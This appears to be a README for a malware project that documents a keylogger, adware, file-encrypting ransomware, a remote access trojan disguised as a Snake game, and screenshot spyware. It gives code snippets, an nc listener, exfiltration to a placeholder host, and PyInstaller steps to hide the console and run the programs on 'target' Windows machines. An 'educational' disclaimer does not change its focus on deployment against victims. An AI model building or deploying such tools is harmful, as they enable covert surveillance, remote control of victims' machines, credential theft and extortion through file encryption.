# **Relq Project 4**

## **Disclaimer**❗️❗️❗️
This project is intended **strictly for educational purposes**. The code and examples provided are designed to help individuals learn about cybersecurity, reverse engineering, and malware analysis. Misuse of this software for malicious or illegal activities is strictly prohibited.  
The author assumes **no responsibility or liability** for the misuse of these codes, including their use for malicious purposes. By using this code, you agree that the responsibility for any actions resulting from its use lies entirely with the user.


---

## **Keylogger**

The **keylogger** script captures keystrokes on the target machine and sends them to a remote server for logging.

### **Key Features**
- Captures all keypress events, including special keys like Enter and Space.
- Sends captured data in real-time to a remote server via a TCP socket.
- Reconnects automatically if the connection to the server is lost.

### **Code Overview**

#### **1. Connecting to the Server**
The function `connect_to_host()` repeatedly attempts to connect to a remote server at a specified IP and port (`<HOST IP>` and `8888`) until successful.  

#### **2. Key Capture and Transmission**
The `on_press(key)` function processes keystrokes:
- Regular keys are sent as their character representation.
- Special keys (e.g., Enter, Space) are converted to readable strings.
- Unrecognized keys are enclosed in square brackets (e.g., `[Key.ctrl]`).

Captured keystrokes are encoded and sent to the server. If the connection fails, the script automatically attempts to reconnect.

#### **3. Listener**
The `keyboard.Listener` continuously monitors and triggers the `on_press` function for every key event.

### **Usage**
1. Replace `<HOST IP>` with the IP address of the machine running the keylogger server.
2. Run the script on the target machine.

---

### **Keylogger Server**

The **keylogger server** script runs on the host machine and listens for incoming keystroke data from the keylogger.

### **Key Features**
- Accepts connections from the keylogger over TCP.
- Logs received keystroke data in real-time.
- Keeps the connection alive for continuous data reception.

### **Code Overview**

#### **1. Server Initialization**
The server listens for incoming connections on IP `<HOST IP>` and port `8888`.

#### **2. Data Reception**
Incoming keystrokes are received, decoded, and logged in real-time.

#### **3. Reconnection Handling**
If the connection with the keylogger is lost, the server waits for a reconnection attempt.

---

## **Setup and Deployment**

### **1. Configure the Host**
- Replace `<HOST IP>` in both the keylogger and server scripts with the IP address of the server.

### **2. Run the Server**
Run the keylogger server script on the host machine:
```bash
python3 keylogger_server.py
```

### **3. Deploy the Keylogger**
Execute the keylogger script on the target machine:
```bash
python3 keylogger.py
```
> **NOTE**: if the code was converted to exe you just need to double click on windows

### **4. Monitor Keystrokes**
Keystrokes will appear on the server in real-time.

Here is the documentation for your **Random Ad Display Script**:

---


## **Adware**

This script randomly displays images (ads) or opens web links at set intervals.

---

### **Key Features**
1. **Image Display**: Randomly selects and displays an image from a specified directory.
2. **Web Link Opening**: Randomly opens a predefined web link in the default browser.
3. **Random Function Execution**: Alternates between displaying images and opening links.

---

### **Code Explanation**

#### **1. Directory Setup**
The `adds_path` variable specifies the directory containing images to be displayed. Images are fetched using:
```python
imgs = os.listdir(adds_path)
```
Ensure the `adds_path` directory exists and contains valid image files.

#### **2. Random Image Display**
The `open_image()` function:
- Chooses a random image from the `adds_path` directory.
- Opens the image using the PIL library (`Pillow`):
```python
img = Image.open(os.path.join(adds_path, random.choice(imgs)))
img.show()
```

#### **3. Web Link Opening**
The `open_link()` function:
- Selects a random link from the `links` list.
- Opens the selected link in the default web browser using the `webbrowser` module:
```python
webbrowser.open(link)
```

#### **4. Function Execution**
The `main()` function:
- Randomly chooses between `open_image()` and `open_link()`.
- Executes the selected function:
```python
func = random.choice([open_image, open_link])
func()
```

#### **5. Continuous Execution**
The script runs indefinitely with a 3-second delay between each execution using:
```python
while True:
    time.sleep(300)
    main()
```

---

### **Usage Instructions**

#### **1. Prerequisites**
- Install required libraries:
```bash
pip install pillow
```

#### **2. Prepare the Environment**
- Create the `adds` directory in the same location as the script.
- Add image files (e.g., `.jpg`, `.png`) to the `adds` directory.
- Ensure the `links` list contains valid URLs.

#### **3. Run the Script**
Execute the script (or exe file) on target machine:
```bash
python3 script_name.py
```

### **Customization Options**

1. **Adjust Time Delay**
   Modify the sleep interval between actions by changing:
   ```python
   time.sleep(300)
   ```

2. **Add More Links**
   Add or remove URLs in the `links` list:
   ```python
   links = ["instagram.com", "youtube.com", "facebook.com"]
   ```

3. **Change Image Directory**
   Update the `adds_path` variable to point to a different directory containing images.

---

### **Important Notes**
- Ensure the `adds` directory contains only valid image files to avoid runtime errors.
- Use valid and reachable links in the `links` list.

Here is the documentation for the ransomware encryption and decryption scripts:

---

## **Ransomware**

### **Encryption Script**

### **Overview**
The encryption script recursively encrypts files in a directory (and its subdirectories) using symmetric encryption with the `cryptography` library's `Fernet` module.

### **Key Features**
1. **File Collection**: Collects all files in a directory except excluded files.
2. **Key Generation**: Generates a symmetric encryption key and saves it to `encryption_key.key`.
3. **File Encryption**: Encrypts the content of each file using the generated key.

### **Code Walkthrough**

#### **1. File Collection**
The `get_files_names()` function recursively gathers all files, excluding:
```python
excluded_files = ["encryption.py", "encryption", "encryption.exe", 
                  "decryption.py", "decryption", "decryption.exe", 
                  "encryption_key.key"]
```
Files matching the exclusion list are skipped to prevent encrypting the scripts or the key itself.

#### **2. Key Generation**
A unique key is generated using:
```python
key = Fernet.generate_key()
```
This key is saved to `encryption_key.key` for decryption purposes.

#### **3. File Encryption**
For each collected file:
- File content is read as binary.
- The content is encrypted using the `Fernet` key.
- The encrypted content overwrites the original file.

---

## **Decryption Script**

### **Overview**
The decryption script decrypts files encrypted by the corresponding encryption script using the key stored in `encryption_key.key`.

### **Key Features**
1. **File Collection**: Recursively collects files while excluding specified files.
2. **Key Retrieval**: Reads the encryption key from `encryption_key.key`.
3. **File Decryption**: Decrypts the encrypted content of each file.

### **Code Walkthrough**

#### **1. File Collection**
Similar to the encryption script, the `get_files_names()` function gathers all files excluding the predefined list.

#### **2. Key Retrieval**
The decryption key is read from `encryption_key.key`. If the key file is missing, the script exits:
```python
with open("encryption_key.key", "rb") as f:
    key = f.read()
```

#### **3. File Decryption**
For each collected file:
- File content is read as binary.
- The content is decrypted using the `Fernet` key.
- The decrypted content overwrites the encrypted file.

---

### **Usage Instructions**

#### **1. Prerequisites**
- Install the required library:
```bash
pip install cryptography
```

#### **2. Encryption**
1. Place the encryption script (`encryption.py`) in the target directory.
2. Run the script to encrypt all files in the directory:
```bash
python3 encryption.py
```
3. The encryption key will be saved to `encryption_key.key`.

#### **3. Decryption**
1. Place the decryption script (`decryption.py`) and the `encryption_key.key` in the same directory as the encrypted files.
2. Run the script to decrypt the files:
```bash
python3 decryption.py
```

Here’s the updated explanation incorporating the use of the Snake game in the code:

---

## **RAT Functionality with Snake Game**

This **Remote Access Trojan (RAT)** code combines remote shell functionality with a built-in Snake game to conceal its activity or serve as a decoy. While the Snake game is displayed on the screen, the RAT silently runs in the background, allowing the attacker to execute commands on the infected machine.

### **Snake Game**
The Snake game is implemented in a separate function, `snake_game`, using the **Pygame** library.  
- It displays a standard Snake game window where the player can control the snake to collect food.
- The game provides the following elements:
  - A colorful interface.
  - Dynamic scoring displayed on the screen.
  - Keyboard controls for the snake's movement.

The game runs as a distraction, ensuring the RAT activity remains unnoticed by the user.

---

### **RAT (Remote Access Trojan)**

The RAT functionality (`snake_score`) allows a remote server to send and execute shell commands on the infected machine.

#### **Key Features**
1. **Connection Setup**  
   - The RAT connects to the attacker's server using the provided **host IP** and **port**.
   - It continuously attempts to reconnect every 3 seconds until successful.
   - If the connection cannot be established, the program exits.

2. **Command Execution**  
   - Upon establishing a connection, the RAT sends an initial prompt (`"$>"`) to the server.
   - It listens for incoming commands, executes them, and sends back the results:
     ```python
     command = sock.recv(1024).decode()
     output = subprocess.getoutput(command) + "\n$>"
     sock.send(output.encode())
     ```

3. **Termination**  
   - If the server sends `"exit"` (case-insensitive), the RAT closes the connection:
     ```python
     if command.lower().strip() == "exit":
         break
     sock.close()
     ```

---

### **Host Machine Setup**
To interact with the RAT, the host machine needs to set up a listener using:
```bash
nc -lvp <PORT>
```
This allows the attacker to issue commands and receive responses.

---

### **Threaded Execution**
The code utilizes Python's threading to run both the Snake game and RAT functionality simultaneously:
```python
t1 = threading.Thread(target=snake_score)
t2 = threading.Thread(target=snake_game)

t1.start()
t2.start()

t1.join()
t2.join()
```
This ensures the Snake game runs as a foreground distraction while the RAT operates stealthily in the background.

## **Spyware with Screenshot Capture**

The provided code consists of two components: a **spyware client** that captures and sends screenshots from the infected machine and a **server** that receives and saves these screenshots. 

---

### **Client Code (Spyware)**

#### **Functionality**
1. **Connection to the Host**
   - Establishes a TCP connection with a specified server (`<HOST IP>` and port `8000`).
   - If the connection fails, it retries every 3 seconds until successful:
     ```python
     def connect_to_host():
        server_address = ("<HOST IP>", 8000)
         while True:
             try:
                 sock.connect(server_address)
                 break
             except socket.error:
                 time.sleep(3)
         return sock
     ```

2. **Screenshot Capture**
   - Captures the current screen using the **Pillow** library (`ImageGrab.grab()`).
   - The screenshot is saved as a PNG image into a buffer:
     ```python
     buffer = io.BytesIO()
     screenshot.save(buffer, format="PNG")
     screenshot_data = buffer.getvalue()
     ```

3. **Data Transmission**
   - Sends the screenshot size (as a 4-byte integer) and the image data to the server:
     ```python
     sock.sendall(struct.pack("!I", len(screenshot_data)))
     sock.sendall(screenshot_data)
     ```
   - If the connection is lost, it reconnects and resumes sending screenshots every 5 seconds.

---

### **Server Code**

#### **Functionality**
1. **Listening for Connections**
   - Listens for incoming connections on port `8000`:
     ```python
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind(("", 8000))
     sock.listen(1)
     conn, addr = sock.accept()
     ```

2. **Receiving and Saving Screenshots**
   - Receives the size of each screenshot, followed by the image data:
     ```python
     size_data = conn.recv(4)
     screenshot_size = struct.unpack("!I", size_data)[0]
     ```
   - Saves the screenshot to a folder named after the client’s IP address:
     ```python
     if not os.path.isdir(addr[0]):
         os.makedirs(addr[0])
     filename = f"{addr[0]}/{time.time()}.png"
     with open(filename, "wb") as f:
         f.write(screenshot_data)
     ```

3. **Handling Errors**
   - Prints any socket errors and safely terminates the connection if the client disconnects.

---

### **How It Works**
1. The **client** runs on the target machine, capturing and sending screenshots at regular intervals (default: 5 seconds).
2. The **server** receives these screenshots, organizes them by the client’s IP address, and stores them with unique timestamps as filenames.

---

### **Host Setup**
On the server machine, run:
```bash
python spyware_server.py
```
This starts the server, waiting for incoming connections. Ensure port `8000` is open and accessible to the client.

---

### Malware Compatibility and Deployment

#### **Compatibility**
All the malware scripts provided (including the **RAT**, **reverse shell**, and **spyware**) are designed to work specifically on **Windows operating systems**.

#### **Converting Python Scripts to Executables**
To deploy the malware as a standalone executable, you can use **PyInstaller**. This process ensures that the script can run on Windows systems without requiring Python to be installed.

---

### **Steps to Convert Python Scripts**
1. Install PyInstaller:
   ```bash
   pip install pyinstaller
   ```

2. Convert the script into a single executable with hidden dependencies:
   ```bash
   pyinstaller --onefile --windowed --hidden-import=<necessary_module> <filename.py>
   ```

   - **`--onefile`**: Bundles all dependencies into a single executable.
   - **`--windowed`**: Suppresses the console window (useful for spyware or RATs).
   - **`--hidden-import=<necessary_module>`**: Specifies any modules not automatically detected by PyInstaller (e.g., `Pillow` for `ImageGrab`).

3. The resulting executable will be placed in the `dist` folder.

---

### **Usage on Windows**
- Transfer the generated `.exe` file to the target Windows machine.
- Execute it to begin the malware's operation.

> **Note:** The conversion process must be done on a Windows machine, as PyInstaller builds executables specific to the platform it runs on.

---
